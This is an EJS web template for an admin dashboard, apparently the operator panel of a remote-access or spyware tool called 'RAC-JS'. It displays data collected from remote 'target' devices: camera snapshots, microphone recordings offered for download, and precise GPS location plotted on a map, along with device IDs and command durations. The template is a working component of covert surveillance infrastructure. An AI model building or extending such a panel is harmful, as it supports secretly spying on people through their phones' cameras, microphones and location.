<!DOCTYPE html>
<html lang="id" class="dark">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Log Detail | RAC-JS Admin</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script>
        tailwind.config = {
            darkMode: 'class',
            theme: {
                extend: {
                    colors: { primary: '#4f46e5', }
                }
            }
        }
    </script>
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"
        integrity="sha256-p4NxAoJBhIIN+hmNHrzRCf9tD/miZyoHS5obTRR9BMY=" crossorigin="" />
    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"
        integrity="sha256-20nQCchB9co0qIjJZRGuk2/Z9VM+kNiyxNV1lvTlZBo=" crossorigin=""></script>
</head>

<body class="bg-gray-900 text-gray-300 min-h-screen font-sans antialiased p-6">
    <% 
        // Helper untuk format WITA
        const formatWITA = (dateStr) => {
            if (!dateStr) return '-';
            const date = new Date(dateStr.endsWith('Z') ? dateStr : dateStr + ' Z');
            return date.toLocaleString('id-ID', { 
                timeZone: 'Asia/Makassar', 
                hour12: false, 
                hour: '2-digit', 
                minute: '2-digit', 
                second: '2-digit', 
                day: '2-digit', 
                month: 'short'
            });
        };

        let durationText = '-';
        if (command && command.created_at && command.completed_at) {
            const start = new Date(command.created_at + ' Z');
            const end = new Date(command.completed_at + ' Z');
            const diffMs = end - start;
            const diffSec = Math.floor(diffMs / 1000);
            if (diffSec < 60) {
                durationText = `${diffSec} detik`;
            } else {
                const mins = Math.floor(diffSec / 60);
                const secs = diffSec % 60;
                durationText = `${mins} menit ${secs} detik`;
            }
        }
    %>
    <div class="max-w-4xl mx-auto flex flex-col gap-6">

        <!-- Header / Navigasi -->
        <div class="flex justify-between items-center bg-gray-800 p-4 rounded-2xl border border-gray-700 shadow-lg">
            <div class="flex items-center gap-3">
                <a href="/admin" class="p-2 bg-gray-700 hover:bg-gray-600 rounded-lg text-gray-300 transition-colors">
                    <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                            d="M10 19l-7-7m0 0l7-7m-7 7h18"></path>
                    </svg>
                </a>
                <h1 class="text-xl font-bold text-white tracking-tight flex items-center gap-2">
                    <svg class="w-6 h-6 text-primary" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                            d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z">
                        </path>
                    </svg>
                    Detail Eksekusi
                </h1>
            </div>

            <div class="inline-flex items-center px-3 py-1.5 rounded-lg text-xs font-bold uppercase tracking-widest border"
                class="<%= log.level === 'ERROR' ? 'bg-red-500/10 text-red-500 border-red-500/20' : (log.level === 'WARN' ? 'bg-yellow-500/10 text-yellow-500 border-yellow-500/20' : 'bg-green-500/10 text-green-500 border-green-500/20') %>">
                <%= log.level %>
            </div>
        </div>

        <!-- Metadata Kartu -->
        <div class="grid grid-cols-1 md:grid-cols-4 gap-4">
            <div class="bg-gray-800 border border-gray-700 p-4 rounded-xl flex flex-col gap-1 shadow-md">
                <span class="text-[10px] font-black text-gray-500 uppercase tracking-widest">Device ID</span>
                <span class="text-primary font-mono text-sm font-semibold truncate">
                    <%= log.device_id || '-' %>
                </span>
            </div>
            <div class="bg-gray-800 border border-gray-700 p-4 rounded-xl flex flex-col gap-1 shadow-md">
                <span class="text-[10px] font-black text-gray-500 uppercase tracking-widest">Waktu (WITA)</span>
                <span class="text-gray-300 font-mono text-sm truncate">
                    <%= formatWITA(log.created_at) %>
                </span>
            </div>
            <div class="bg-gray-800 border border-gray-700 p-4 rounded-xl flex flex-col gap-1 shadow-md">
                <span class="text-[10px] font-black text-gray-500 uppercase tracking-widest">Durasi</span>
                <span class="text-indigo-400 font-mono text-sm truncate font-bold">
                    <%= durationText %>
                </span>
            </div>
            <div class="bg-gray-800 border border-gray-700 p-4 rounded-xl flex flex-col gap-1 shadow-md">
                <span class="text-[10px] font-black text-gray-500 uppercase tracking-widest">Tipe Payload</span>
                <span class="text-gray-300 font-mono text-sm truncate uppercase font-bold text-indigo-400">
                    <%= parsedBody.type ? parsedBody.type : 'RAW JSON' %>
                </span>
            </div>
        </div>

        <!-- Wadah Konten / Smart Renderer -->
        <div class="bg-gray-800 border border-gray-700 p-6 rounded-2xl shadow-xl flex flex-col gap-4">
            <h2 class="text-lg font-semibold text-white border-b border-gray-700 pb-3">Hasil / Lampiran Respons</h2>

            <div class="w-full flex justify-center items-center mt-2">
                <% if ((parsedBody.type==='photo_base64' || parsedBody.type==='photo_url' ) && parsedBody.data) { %>
                    <div class="relative group">
                        <img src="<%= parsedBody.type === 'photo_url' ? parsedBody.data : 'data:image/jpeg;base64,' + parsedBody.data %>"
                            alt="Jepretan Kamera Target"
                            class="max-w-full h-auto max-h-[70vh] rounded-lg shadow-2xl border border-gray-700 transition-transform hover:scale-[1.02]">
                        <div
                            class="absolute bottom-2 right-2 bg-black/60 px-2 py-1 rounded text-xs text-white backdrop-blur-sm shadow">
                            Kamera Bot</div>
                    </div>

                    <% } else if ((parsedBody.type==='audio_base64' || parsedBody.type==='audio_url' ) &&
                        parsedBody.data) { %>
                        <div
                            class="w-full max-w-md bg-gray-900 border border-gray-700 p-5 rounded-xl shadow-lg flex flex-col gap-4 items-center">
                            <svg class="w-16 h-16 text-primary mb-2" fill="none" stroke="currentColor"
                                viewBox="0 0 24 24">
                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                                    d="M19 11a7 7 0 01-7 7m0 0a7 7 0 01-7-7m7 7v4m0 0H8m4 0h4m-4-8a3 3 0 01-3-3V5a3 3 0 116 0v6a3 3 0 01-3 3z">
                                </path>
                            </svg>
                            <h3 class="text-gray-300 font-medium">Rekaman Mikrofon Target</h3>
                            <audio controls class="w-full">
                                <% if (parsedBody.type==='audio_url' ) { %>
                                    <source src="<%= parsedBody.data %>" type="audio/mp4">
                                    <% } else { %>
                                        <source src="data:audio/mp4;base64,<%= parsedBody.data %>" type="audio/mp4">
                                        <source src="data:audio/aac;base64,<%= parsedBody.data %>" type="audio/aac">
                                        <source src="data:audio/3gpp;base64,<%= parsedBody.data %>" type="audio/3gpp">
                                        <source src="data:audio/wav;base64,<%= parsedBody.data %>" type="audio/wav">
                                        <source src="data:audio/mpeg;base64,<%= parsedBody.data %>" type="audio/mpeg">
                                        <% } %>
                                            Browser Anda tidak mendukung elemen audio.
                            </audio>
                            <a href="<%= parsedBody.type === 'audio_url' ? parsedBody.data : 'data:audio/3gpp;base64,' + parsedBody.data %>"
                                download="record_<%= log.id %>.<%= parsedBody.type === 'audio_url' ? 'mp4' : '3gp' %>"
                                class="mt-2 text-xs text-primary hover:text-indigo-400 underline">Unduh File Audio
                                Mentah</a>
                        </div>

                        <% } else if ((parsedBody.type==='location' || parsedBody.type==='location_data' ) &&
                            parsedBody.data) { %>
                            <div class="w-full flex flex-col gap-4">
                                <div class="grid grid-cols-2 gap-4">
                                    <div class="bg-gray-900 p-3 rounded-lg border border-gray-700">
                                        <span class="block text-xs text-gray-500 uppercase font-bold">Latitude</span>
                                        <span class="text-white font-mono">
                                            <%= parsedBody.data.lat %>
                                        </span>
                                    </div>
                                    <div class="bg-gray-900 p-3 rounded-lg border border-gray-700">
                                        <span class="block text-xs text-gray-500 uppercase font-bold">Longitude</span>
                                        <span class="text-white font-mono">
                                            <%= parsedBody.data.lon || parsedBody.data.lng %>
                                        </span>
                                    </div>
                                </div>

                                <!-- Container Map Leaflet -->
                                <div id="map-container"
                                    class="w-full h-80 rounded-xl shadow-lg border border-gray-700 relative z-0 overflow-hidden">
                                </div>

                                <script>
                                    document.addEventListener('DOMContentLoaded', () => {
                                        const lat = parseFloat('<%= parsedBody.data.lat %>');
                                        const lon = parseFloat('<%= parsedBody.data.lon || parsedBody.data.lng %>');
                                        if (!isNaN(lat) && !isNaN(lon)) {
                                            const map = L.map('map-container').setView([lat, lon], 16);
                                            // TileLayer Dark Mode CartoDB Dark Matter
                                            L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {
                                                attribution: '&copy; <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a> contributors &copy; <a href="https://carto.com/attributions">CARTO</a>',
                                                subdomains: 'abcd',
                                                maxZoom: 20
                                            }).addTo(map);

                                            // Marker
                                            const marker = L.marker([lat, lon]).addTo(map);
                                            marker.bindPopup(`<b>Lokasi Perangkat Target</b><br>Tingkat Akurasi: <%= parsedBody.data.accuracy || '-' %> meter`).openPopup();
                                        }
                                    });
                                </script>

                                <a href="<%= parsedBody.data.google_maps || `https://www.google.com/maps?q=${parsedBody.data.lat},${parsedBody.data.lon || parsedBody.data.lng}` %>"
                                    target="_blank"
                                    class="w-full flex items-center justify-center gap-2 bg-gray-800 hover:bg-gray-700 text-white font-bold py-3 px-4 rounded-xl transition-colors border border-gray-600">
                                    <svg class="w-5 h-5 text-gray-400" fill="none" stroke="currentColor"
                                        viewBox="0 0 24 24">
                                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                                            d="M17.657 16.657L13.414 20.9a1.998 1.998 0 01-2.827 0l-4.244-4.243a8 8 0 1111.314 0z">
                                        </path>
                                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                                            d="M15 11a3 3 0 11-6 0 3 3 0 016 0z"></path>
                                    </svg>
                                    Buka Penuh di Peta Eksternal
                                </a>
                            </div>

                            <% } else { %>
                                <!-- JSON RAW Output -->
                                <div
                                    class="w-full bg-gray-900 border border-gray-700 rounded-xl overflow-x-auto p-4 custom-scrollbar">
                                    <pre
                                        class="text-sm font-mono text-green-400 whitespace-pre-wrap"><%= Object.keys(parsedBody).length > 0 ? JSON.stringify(parsedBody, null, 2) : log.message %></pre>
                                </div>
                                <% } %>
            </div>
        </div>

    </div>

    <style>
        .custom-scrollbar::-webkit-scrollbar {
            height: 8px;
            width: 8px;
        }

        .custom-scrollbar::-webkit-scrollbar-track {
            background: #1f2937;
            border-radius: 4px;
        }

        .custom-scrollbar::-webkit-scrollbar-thumb {
            background: #374151;
            border-radius: 4px;
        }

        .custom-scrollbar::-webkit-scrollbar-thumb:hover {
            background: #4b5563;
        }
    </style>
</body>

</html>